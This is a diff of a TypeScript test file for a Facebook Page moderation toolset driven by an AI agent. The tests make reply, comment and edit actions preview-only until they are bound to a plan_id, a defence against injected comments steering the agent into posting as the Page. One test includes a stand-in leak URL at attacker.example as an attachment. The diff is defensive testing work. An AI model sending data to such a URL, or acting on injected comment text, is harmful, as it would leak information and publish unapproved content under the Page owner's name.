@@ -252,6 +252,21 @@ function tool(name: string): ToolSpec {
   return spec;
 }
 
+/**
+ * Drive a plan-bound free-text verb the only way it can apply (SEC-01): preview
+ * first, then `apply:true` bound to that preview's `plan_id`. Returns the apply
+ * call's result; the preview is asserted to have performed nothing.
+ */
+async function applyViaPlan(
+  name: string,
+  args: Record<string, unknown>,
+  ctx: WriteToolContext,
+): Promise<ToolResult> {
+  const preview = body(await tool(name).handler(args, ctx));
+  assert.equal(preview.status, 'preview', `${name} must preview before it applies`);
+  return tool(name).handler({ ...args, apply: true, plan_id: str(preview.planId) }, ctx);
+}
+
 /** The raw JSON text of a tool result (what actually reaches the model). */
 function text(result: ToolResult): string {
   return result.content[0]?.text ?? '';
@@ -348,8 +363,9 @@ test('createModerationPackage is enabled by default and defaults to apply mode',
 
   assert.equal(pkg.name, 'moderation');
   assert.equal(pkg.enabledByDefault, true);
-  // A6/UX #6: reversible day-to-day moderation must not stack a preview plus a
-  // confirm on every comment. The irreversible tools override this (C4).
+  // A6/UX #6: reversible text-free moderation must not stack a preview plus a
+  // confirm on every comment. The irreversible tools override this (C4), and
+  // the free-text verbs are plan-bound regardless (SEC-01).
   assert.equal(pkg.writeModeDefault, 'apply');
   assert.deepEqual(
     pkg.tools.map((t) => t.name),
@@ -914,15 +930,29 @@ test('a reversible reply previews and touches nothing when the mode is plan', as
   assert.equal(journal.entries.length, 0, 'nothing to journal — nothing happened');
 });
 
-test('the package apply default carries a reversible reply through without a plan_id', async () => {
+test('the package apply default never posts a free-text reply without a plan_id', async () => {
   const { fb, ctx, journal } = makeHarness();
   fb.on((r) => r.method === 'POST' && r.path === '/c1/comments', fbOk({ id: 'c1_r1' }));
+  const reply = tool('facebook_reply_to_comment');
+  const args = { comment_id: 'c1', message: 'Thanks for the feedback!' };
 
+  // SEC-01: one call steered by an injected comment must not publish as the Page.
+  // 1. No apply at all, under writeModeDefault:'apply' — only a preview.
+  const bare = body(await reply.handler(args, ctx));
+  assert.equal(bare.status, 'preview');
+  assert.equal(bare.applied, false);
+  assert.equal(bare.tier, 'reversible', 'plan-bound without raising the tier');
+
+  // 2. apply:true but no plan_id — still a preview, naming what is missing.
+  const unbound = body(await reply.handler({ ...args, apply: true }, ctx));
+  assert.equal(unbound.status, 'preview');
+  assert.ok(arr(unbound.warnings).some((w) => str(w).includes('plan_id')));
+  assert.equal(fb.calls.length, 0, 'nothing may be posted without a bound plan');
+  assert.equal(journal.entries.length, 0);
+
+  // 3. apply:true bound to the preview's plan_id — now it posts.
   const payload = body(
-    await tool('facebook_reply_to_comment').handler(
-      { comment_id: 'c1', message: 'Thanks for the feedback!' },
-      ctx,
-    ),
+    await reply.handler({ ...args, apply: true, plan_id: str(unbound.planId) }, ctx),
   );
 
   assert.equal(payload.status, 'applied');
@@ -948,7 +978,8 @@ test('a reply acknowledged without an id is not applied and journalled attempted
   fb.on((r) => r.method === 'POST' && r.path === '/c1/comments', fbOk({}));
 
   const payload = body(
-    await tool('facebook_reply_to_comment').handler(
+    await applyViaPlan(
+      'facebook_reply_to_comment',
       { comment_id: 'c1', message: 'Thanks for the feedback!' },
       ctx,
     ),
@@ -979,7 +1010,8 @@ test('a reply whose answer was lost is journaled attempted, not failed', async (
 
   await assert.rejects(
     () =>
-      tool('facebook_reply_to_comment').handler(
+      applyViaPlan(
+        'facebook_reply_to_comment',
         { comment_id: 'c1', message: 'Thanks for the feedback!' },
         ctx,
       ),
@@ -1001,7 +1033,8 @@ test('a reply Facebook refused with an error envelope stays journaled failed', a
   );
 
   await assert.rejects(() =>
-    tool('facebook_reply_to_comment').handler(
+    applyViaPlan(
+      'facebook_reply_to_comment',
       { comment_id: 'c1', message: 'Thanks for the feedback!' },
       ctx,
     ),
@@ -1034,14 +1067,16 @@ test('a reply can carry an image URL or a GIF URL instead of text', async () => 
   const { fb, ctx, journal } = makeHarness();
   fb.on((r) => r.method === 'POST' && r.path === '/c1/comments', fbOk({ id: 'c1_r1' }));
 
-  await tool('facebook_reply_to_comment').handler(
+  await applyViaPlan(
+    'facebook_reply_to_comment',
     {
       comment_id: 'c1',
       attachment: { kind: 'image_url', url: 'https://cdn.example.com/a.jpg' },
     },
     ctx,
   );
-  await tool('facebook_reply_to_comment').handler(
+  await applyViaPlan(
+    'facebook_reply_to_comment',
     {
       comment_id: 'c1',
       message: 'ha',
@@ -1074,7 +1109,8 @@ test('a reply uploads a local photo as the multipart source part', async (t) => 
   fb.on((r) => r.method === 'POST' && r.path === '/c1/comments', fbOk({ id: 'c1_r1' }));
 
   const payload = body(
-    await tool('facebook_reply_to_comment').handler(
+    await applyViaPlan(
+      'facebook_reply_to_comment',
       {
         comment_id: 'c1',
         message: 'Here',
@@ -1229,13 +1265,15 @@ test("a comment on another author's post warns and quotes it only inside a taint
 
 test('an applied comment on a post sends message and photo and journals the write', async () => {
   const { fb, ctx, journal } = makeHarness();
+  fb.on((r) => r.method === 'GET' && r.path === `/${POST_ID}`, fbOk(postNode()));
   fb.on(
     (r) => r.method === 'POST' && r.path === `/${POST_ID}/comments`,
     fbOk({ id: `${POST_ID}_c1` }),
   );
 
   const payload = body(
-    await tool('facebook_comment_on_post').handler(
+    await applyViaPlan(
+      'facebook_comment_on_post',
       {
         post_id: POST_ID,
         message: 'Tickets are live',
@@ -1247,7 +1285,9 @@ test('an applied comment on a post sends message and photo and journals the writ
 
   assert.equal(payload.status, 'applied');
   assert.deepEqual(payload.result, { id: `${POST_ID}_c1` });
-  assert.deepEqual(bodyOf(firstCall(fb)), {
+  const post = jsonCalls(fb).find((r) => r.method === 'POST');
+  assert.ok(post);
+  assert.deepEqual(bodyOf(post), {
     message: 'Tickets are live',
     attachment_url: 'https://example.com/poster.jpg',
   });
@@ -1262,6 +1302,7 @@ test('an applied comment on a post sends message and photo and journals the writ
 
 test('a comment on a post whose answer was lost is attempted and points at the listing', async () => {
   const { fb, ctx, journal } = makeHarness();
+  fb.on((r) => r.method === 'GET' && r.path === `/${POST_ID}`, fbOk(postNode()));
   fb.on(
     (r) => r.method === 'POST' && r.path === `/${POST_ID}/comments`,
     fbErr(ambiguousWriteError()),
@@ -1269,7 +1310,7 @@ test('a comment on a post whose answer was lost is attempted and points at the l
 
   await assert.rejects(
     () =>
-      tool('facebook_comment_on_post').handler({ post_id: POST_ID, message: 'Hi' }, ctx),
+      applyViaPlan('facebook_comment_on_post', { post_id: POST_ID, message: 'Hi' }, ctx),
     (err: unknown) =>
       err instanceof GraphApiError && err.action?.category === 'ambiguous',
   );
@@ -1283,10 +1324,12 @@ test('a comment on a post whose answer was lost is attempted and points at the l
 
 test('a comment acknowledged without an id is not applied and says to check the listing', async () => {
   const { fb, ctx, journal } = makeHarness();
+  fb.on((r) => r.method === 'GET' && r.path === `/${POST_ID}`, fbOk(postNode()));
   fb.on((r) => r.method === 'POST' && r.path === `/${POST_ID}/comments`, fbOk({}));
 
   const payload = body(
-    await tool('facebook_comment_on_post').handler(
+    await applyViaPlan(
+      'facebook_comment_on_post',
       { post_id: POST_ID, message: 'Hi' },
       ctx,
     ),
@@ -1380,7 +1423,8 @@ test('an applied edit posts the new message and journals only fingerprints', asy
   fb.on(isEditRead, fbOk(ownComment()));
   fb.on((r) => r.method === 'POST' && r.path === '/c1', fbOk({ success: true }));
 
-  const result = await tool('facebook_edit_comment').handler(
+  const result = await applyViaPlan(
+    'facebook_edit_comment',
     { comment_id: 'c1', message: 'doors open at 8pm' },
     ctx,
   );
@@ -1448,7 +1492,7 @@ test('an edit Facebook answers with success:false is failed, not applied', async
   fb.on((r) => r.method === 'POST', fbOk({ success: false }));
 
   const payload = body(
-    await tool('facebook_edit_comment').handler({ comment_id: 'c1', message: 'x' }, ctx),
+    await applyViaPlan('facebook_edit_comment', { comment_id: 'c1', message: 'x' }, ctx),
   );
 
   assert.notEqual(payload.status, 'applied');
@@ -1838,6 +1882,48 @@ function isStateRead(req: FbRequest): boolean {
     isJson(req) && req.method === 'GET' && paramsOf(req).fields === 'id,message,is_hidden'
   );
 }
+
+test('the package apply default previews a comment on a post or an edit, never posts it', async () => {
+  const { fb, ctx, journal } = makeHarness();
+  fb.on((r) => r.method === 'GET' && r.path === `/${POST_ID}`, fbOk(postNode()));
+  fb.on(isEditRead, fbOk(ownComment()));
+  fb.on((r) => r.method === 'POST', fbOk({ success: true, id: 'x' }));
+
+  for (const [name, args] of [
+    ['facebook_comment_on_post', { post_id: POST_ID, message: 'Hi' }],
+    [
+      'facebook_comment_on_post',
+      { post_id: POST_ID, attachment_url: 'https://attacker.example/?d=leak' },
+    ],
+    ['facebook_edit_comment', { comment_id: 'c1', message: 'new text' }],
+  ] as const) {
+    for (const extra of [{}, { apply: true }]) {
+      const payload = body(await tool(name).handler({ ...args, ...extra }, ctx));
+      assert.equal(payload.status, 'preview', `${name} ${JSON.stringify(extra)}`);
+    }
+  }
+  assert.ok(!anyCall(fb, 'POST'), 'no free text reaches the Page without a bound plan');
+  assert.equal(journal.entries.length, 0);
+});
+
+test('the package apply default still hides, unhides and likes in one call', async () => {
+  const { fb, ctx } = makeHarness();
+  fb.on(isStateRead, fbOk({ id: 'c1', message: 'hi', is_hidden: false }));
+  fb.on(
+    isLikeStateRead,
+    fbOk({ id: 'c1', message: 'hi', is_hidden: false, user_likes: false }),
+  );
+  fb.on((r) => r.method === 'POST', fbOk({ success: true }));
+
+  for (const [name, args] of [
+    ['facebook_hide_comment', { comment_ids: ['c1'], hidden: true }],
+    ['facebook_hide_comment', { comment_ids: ['c1'], hidden: false }],
+    ['facebook_like_comment', { comment_ids: ['c1'] }],
+  ] as const) {
+    const payload = body(await tool(name).handler(args, ctx));
+    assert.equal(payload.status, 'applied', `${name} ${JSON.stringify(args)}`);
+  }
+});
 
 test('the apply default never deletes: irreversible needs apply:true AND a plan_id', async () => {
   const { fb, ctx, journal } = makeHarness();
@@ -2771,7 +2857,8 @@ test('a reply refused at connect time is journaled failed, not attempted', async
   );
 
   await assert.rejects(() =>
-    tool('facebook_reply_to_comment').handler(
+    applyViaPlan(
+      'facebook_reply_to_comment',
       { comment_id: 'c1', message: 'Thanks for the feedback!' },
       ctx,
     ),
